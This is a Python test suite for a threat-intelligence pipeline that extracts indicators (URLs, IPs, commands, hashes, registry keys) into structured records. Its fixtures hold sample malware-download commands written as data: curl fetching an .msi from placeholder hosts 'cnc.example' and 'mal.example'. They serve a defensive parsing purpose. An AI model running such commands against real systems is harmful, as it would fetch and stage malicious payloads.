"""Phase 2.5 · IEP Contract & Validation Suite.

Every adapter, every engine touching an IEP, and every migration must
pass these contract tests.  If they fail, the pipeline is broken.

See /app/memory/NIVXRAY_ARCHITECTURE_V1.md.
"""
from __future__ import annotations

import pytest
from datetime import datetime, timezone

from models import (
    IEP,
    IEP_SCHEMA_VERSION,
    IEPArtifact,
    IEPProvenance,
    IEPRelationship,
    IEPSource,
    IEPStatistics,
    IEPWarning,
    make_iep,
)
from models.iep import IEPContent, IEPMetadata


# ─── Schema Version ────────────────────────────────────────────────────
def test_schema_version_is_semver():
    parts = IEP_SCHEMA_VERSION.split(".")
    assert len(parts) == 3
    assert all(p.isdigit() for p in parts)


# ─── R3 · IEP must round-trip cleanly ──────────────────────────────────
def test_iep_json_roundtrip_lossless():
    iep = make_iep(
        source=IEPSource(kind="url", url="https://x/y"),
        content=IEPContent(text="hello world"),
        artifacts=[
            IEPArtifact(type="url", value="https://x/y",
                          source_ref="text.line.1"),
            IEPArtifact(type="ip",  value="10.0.0.1",
                          source_ref="text.line.1", confidence=0.9),
        ],
        relationships=[
            IEPRelationship(from_ref="https://x/y", to_ref="10.0.0.1",
                              verb="resolves_to"),
        ],
        adapter="uil.url_only",
    )
    raw = iep.model_dump_json()
    back = IEP.model_validate_json(raw)
    assert back.id == iep.id
    assert back.schema_version == IEP_SCHEMA_VERSION
    assert len(back.artifacts) == 2
    assert back.statistics.urls == 1
    assert back.statistics.ips  == 1


# ─── Statistics are derived from artifacts ─────────────────────────────
def test_statistics_auto_derived():
    iep = make_iep(
        source=IEPSource(kind="text"),
        artifacts=[
            IEPArtifact(type="command", value="whoami"),
            IEPArtifact(type="command", value="hostname"),
            IEPArtifact(type="hash", value="a"*64),
            IEPArtifact(type="mitre_technique", value="T1059"),
        ],
    )
    assert iep.statistics.commands == 2
    assert iep.statistics.hashes   == 1
    assert iep.statistics.mitre    == 1
    assert iep.statistics.other    == 0


# ─── R6 · Provenance always present ────────────────────────────────────
def test_provenance_always_populated():
    iep = make_iep(source=IEPSource(kind="text"), adapter="test.adapter",
                     adapter_version="9.9")
    assert iep.provenance.adapter == "test.adapter"
    assert iep.provenance.adapter_version == "9.9"
    assert isinstance(iep.provenance.captured_at, datetime)
    assert iep.provenance.captured_at.tzinfo is not None


def test_provenance_chain_for_recursive_iep():
    """R4 · Investigation Orchestrator is the only recursion source.
    When an artifact from IEP-A becomes a new IEP-B, IEP-B.provenance
    must reference IEP-A."""
    parent = make_iep(source=IEPSource(kind="url", url="https://x"))
    child  = make_iep(
        source=IEPSource(kind="command"),
        adapter="uil.command",
        parent_iep_id=parent.id,
        pipeline_depth=1,
    )
    assert child.provenance.parent_iep_id == parent.id
    assert child.provenance.pipeline_depth == 1


# ─── R5 · Engines read artifacts, not raw content ──────────────────────
def test_engines_can_read_by_type_without_touching_content():
    iep = make_iep(
        source=IEPSource(kind="image", filename="talos.jpg"),
        content=IEPContent(text="raw OCR output …"),
        artifacts=[
            IEPArtifact(type="url", value="https://cnc.example/x",
                          source_ref="ocr.block.3"),
            IEPArtifact(type="command", value="curl -o x.msi https://cnc.example/x",
                          source_ref="ocr.block.4"),
        ],
    )
    # An engine only queries by_type / values_of.
    urls = iep.values_of("url")
    cmds = iep.by_type("command")
    assert urls == ["https://cnc.example/x"]
    assert len(cmds) == 1
    assert cmds[0].source_ref == "ocr.block.4"


# ─── Warnings surface adapter limitations ──────────────────────────────
def test_warnings_flow_through():
    iep = make_iep(
        source=IEPSource(kind="pdf", filename="x.pdf"),
        warnings=[
            IEPWarning(severity="warn", code="pdf_encrypted",
                         message="Password-protected — text extraction skipped."),
        ],
        adapter="adapter.pdf",
    )
    assert len(iep.warnings) == 1
    assert iep.warnings[0].code == "pdf_encrypted"


# ─── R3 · Relationships carry provenance ───────────────────────────────
def test_relationships_have_provenance_field():
    rel = IEPRelationship(from_ref="curl.exe", to_ref="https://x/y.msi",
                            verb="downloads", source_ref="ocr.block.4")
    assert rel.source_ref == "ocr.block.4"


# ─── Canonicalisation preserved ────────────────────────────────────────
def test_artifact_canonical_form_kept():
    a = IEPArtifact(type="registry_key",
                      value="HKLM\\SOFTWARE\\Run",
                      canonical="HKEY_LOCAL_MACHINE\\SOFTWARE\\Run")
    # Engines that need canonical form use `values_of` which prefers canonical.
    iep = make_iep(source=IEPSource(kind="text"), artifacts=[a])
    assert iep.values_of("registry_key") == ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Run"]


# ─── Confidence is bounded ─────────────────────────────────────────────
def test_confidence_bounds_enforced():
    with pytest.raises(Exception):
        IEPArtifact(type="url", value="https://x", confidence=1.5)
    with pytest.raises(Exception):
        IEPArtifact(type="url", value="https://x", confidence=-0.1)


# ─── RelationshipType — Enum + UNKNOWN escape hatch ────────────────────
from models import RelationshipType


def test_relationship_verb_accepts_enum():
    rel = IEPRelationship(from_ref="a", to_ref="b",
                            verb=RelationshipType.DOWNLOADS)
    assert rel.verb == RelationshipType.DOWNLOADS


def test_relationship_verb_accepts_matching_string():
    rel = IEPRelationship(from_ref="a", to_ref="b", verb="downloads")
    assert rel.verb == RelationshipType.DOWNLOADS


def test_relationship_unknown_verb_falls_back_to_UNKNOWN():
    """User directive 2026-02-06 — unknown verbs must coerce to
    RelationshipType.UNKNOWN, never break deserialization."""
    rel = IEPRelationship(
        from_ref="a", to_ref="b",
        verb="calls_api",                          # not in enum
        original_relationship="calls_api",
    )
    assert rel.verb == RelationshipType.UNKNOWN
    assert rel.original_relationship == "calls_api"


def test_relationship_json_roundtrip_with_enum():
    rel = IEPRelationship(from_ref="a", to_ref="b", verb="hosted_on")
    raw = rel.model_dump_json()
    back = IEPRelationship.model_validate_json(raw)
    assert back.verb == RelationshipType.HOSTED_ON


def test_relationship_enum_covers_all_documented_verbs():
    """Every verb the frozen doc lists must exist in the enum."""
    documented = {
        "contains", "attaches", "embeds", "extracted_from",
        "downloads", "uploads", "writes", "reads",
        "executes", "spawns", "loads", "injects",
        "imports", "exports", "calls",
        "hosted_on", "resolves_to", "connects_to",
        "references", "mentions", "attributed_to",
        "signed_by", "trusts", "unknown",
    }
    enum_values = {r.value for r in RelationshipType}
    missing = documented - enum_values
    assert not missing, f"enum missing documented verbs: {missing}"


# ─── R10 · Idempotent Adapters ─────────────────────────────────────────
def _strip_nondeterministic(iep_dict):
    """Remove fields that are permitted to differ between runs (id,
    timestamps, execution time, processing time)."""
    import copy
    d = copy.deepcopy(iep_dict)
    d.pop("id", None)
    prov = dict(d.get("provenance") or {})
    prov.pop("captured_at", None)
    d["provenance"] = prov
    meta = dict(d.get("metadata") or {})
    adapter = dict((meta.get("data") or {}).get("adapter") or {})
    adapter.pop("execution_time_ms", None)
    if adapter:
        meta_data = dict(meta.get("data") or {})
        meta_data["adapter"] = adapter
        meta["data"] = meta_data
        d["metadata"] = meta
    stats = dict(d.get("statistics") or {})
    stats.pop("processing_time_ms", None)
    d["statistics"] = stats
    # Artifact / relationship IDs are UUIDs — allowed to differ per run.
    for a in d.get("artifacts") or []:
        a.pop("id", None)
    return d


def test_r10_text_adapter_is_idempotent():
    from services.adapters import TextAdapter
    body = ("whoami\n"
            "curl.exe -o C:\\a.msi https://mal.example/a.msi\n"
            "10.0.0.42\n"
            "CVE-2024-57727\n")
    a = TextAdapter()
    iep_a = a.make_iep(body).model_dump()
    iep_b = a.make_iep(body).model_dump()
    assert _strip_nondeterministic(iep_a) == _strip_nondeterministic(iep_b), \
        "Text adapter is not idempotent"


def test_r10_pdf_adapter_is_idempotent():
    from tests.test_adapter_pdf import PDF_BYTES
    from services.adapters import PDFAdapter
    a = PDFAdapter()
    iep_a = a.make_iep(PDF_BYTES).model_dump()
    iep_b = a.make_iep(PDF_BYTES).model_dump()
    assert _strip_nondeterministic(iep_a) == _strip_nondeterministic(iep_b), \
        "PDF adapter is not idempotent"


def test_r10_eml_adapter_is_idempotent():
    from tests.test_adapter_eml import EML_BYTES
    from services.adapters import EMLAdapter
    a = EMLAdapter()
    iep_a = a.make_iep(EML_BYTES).model_dump()
    iep_b = a.make_iep(EML_BYTES).model_dump()
    assert _strip_nondeterministic(iep_a) == _strip_nondeterministic(iep_b), \
        "EML adapter is not idempotent"


# ─── Stable adapter.id (rename-proof replay) ───────────────────────────
def test_every_adapter_manifest_has_stable_id():
    from services.adapters import (
        DOCXAdapter, EMLAdapter, PDFAdapter, TextAdapter,
    )
    from tests.test_adapter_pdf  import PDF_BYTES
    from tests.test_adapter_docx import DOCX_BYTES
    from tests.test_adapter_eml  import EML_BYTES

    cases = [
        TextAdapter().make_iep("whoami\n"),
        PDFAdapter().make_iep(PDF_BYTES),
        DOCXAdapter().make_iep(DOCX_BYTES),
        EMLAdapter().make_iep(EML_BYTES),
    ]
    for iep in cases:
        m = iep.metadata.data["adapter"]
        assert m.get("id"), f"missing adapter.id for {m.get('name')}"
        assert m["id"] == f"{m['name']}@{m['version']}", m
